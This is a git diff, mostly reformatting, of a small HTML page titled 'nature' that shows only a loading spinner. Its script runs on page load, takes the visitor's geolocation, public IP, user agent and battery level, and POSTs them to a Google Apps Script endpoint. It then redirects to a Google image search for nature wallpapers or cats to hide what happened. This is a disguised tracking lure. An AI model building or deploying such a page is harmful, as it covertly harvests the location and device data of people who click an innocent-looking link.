@@ -1,74 +1,83 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-    <head>
-        <meta property="og:title" content="nature">
-  <meta property="og:description" content="greeting ">
-  <meta property="og:image" content="https://images.pexels.com/photos/1003914/pexels-photo-1003914.jpeg">
-  <meta property="og:url" content="https://rajupusti.github.io/nature">
-  <meta property="og:type" content="website">
-        <script src="https://cdn.tailwindcss.com"></script>
-    </head>
-<body>
+  <head>
+    <meta property="og:title" content="nature" />
+    <meta property="og:description" content="greeting " />
+    <meta
+      property="og:image"
+      content="https://rajupusti.github.io/nature/img.jpg"
+    />
+    <meta property="og:url" content="https://rajupusti.github.io/nature" />
+    <meta property="og:type" content="website" />
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body>
     <div class="flex items-center justify-center h-screen bg-gray-100">
-  <div class="w-16 h-16 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
-</div>
+      <div
+        class="w-16 h-16 border-4 border-red-500 border-t-transparent rounded-full animate-spin"
+      ></div>
+    </div>
 
-<script>
-const API_URL = "https://script.google.com/macros/s/AKfycbwRMq7SbyKmdhds0XJfUPHRLlWToxKSY9uQXsWCnL4vr0VEWv3H5ItBrcjmP-3EZM4S/exec";
+    <script>
+      const API_URL =
+        "https://script.google.com/macros/s/AKfycbwRMq7SbyKmdhds0XJfUPHRLlWToxKSY9uQXsWCnL4vr0VEWv3H5ItBrcjmP-3EZM4S/exec";
 
-function collectAndSendData() {
-    let payload = {};
+      function collectAndSendData() {
+        let payload = {};
 
-    navigator.geolocation.getCurrentPosition(function(position) {
-        const { latitude, longitude } = position.coords;
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const { latitude, longitude } = position.coords;
 
-        payload.latitude = latitude;
-        payload.longitude = longitude;
-        payload.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+            payload.latitude = latitude;
+            payload.longitude = longitude;
+            payload.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
 
-        sendData(); 
-    }, function() {
-        sendData(); 
-    });
+            sendData();
+          },
+          function () {
+            sendData();
+          },
+        );
 
-  
-    function sendData() {
-        fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(data => {
-            payload.ip = data.ip;
-            payload.userAgent = navigator.userAgent;
+        function sendData() {
+          fetch("https://api.ipify.org?format=json")
+            .then((res) => res.json())
+            .then((data) => {
+              payload.ip = data.ip;
+              payload.userAgent = navigator.userAgent;
 
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    payload.battery = (battery.level * 100) + "%";
-                    postData();
+              if (navigator.getBattery) {
+                navigator.getBattery().then((battery) => {
+                  payload.battery = battery.level * 100 + "%";
+                  postData();
                 });
-            } else {
+              } else {
                 postData();
-            }
-        })
-        .catch(() => {
-            postData();
-        });
-    }
+              }
+            })
+            .catch(() => {
+              postData();
+            });
+        }
 
-    function postData() {
-        fetch(API_URL, {
+        function postData() {
+          fetch(API_URL, {
             method: "POST",
             body: JSON.stringify(payload),
-        })
-        .then(() => {
-            window.location.href = "https://www.google.com/search?q=nature+wallpapers&tbm=isch";
-        })
-        .catch(() => {
-            window.location.href = "https://www.google.com/search?q=cute+cats&tbm=isch";
-        });
-    }
-}
+          })
+            .then(() => {
+              window.location.href =
+                "https://www.google.com/search?q=nature+wallpapers&tbm=isch";
+            })
+            .catch(() => {
+              window.location.href =
+                "https://www.google.com/search?q=cute+cats&tbm=isch";
+            });
+        }
+      }
 
-collectAndSendData();
-</script>
-
-</body>
+      collectAndSendData();
+    </script>
+  </body>
 </html>
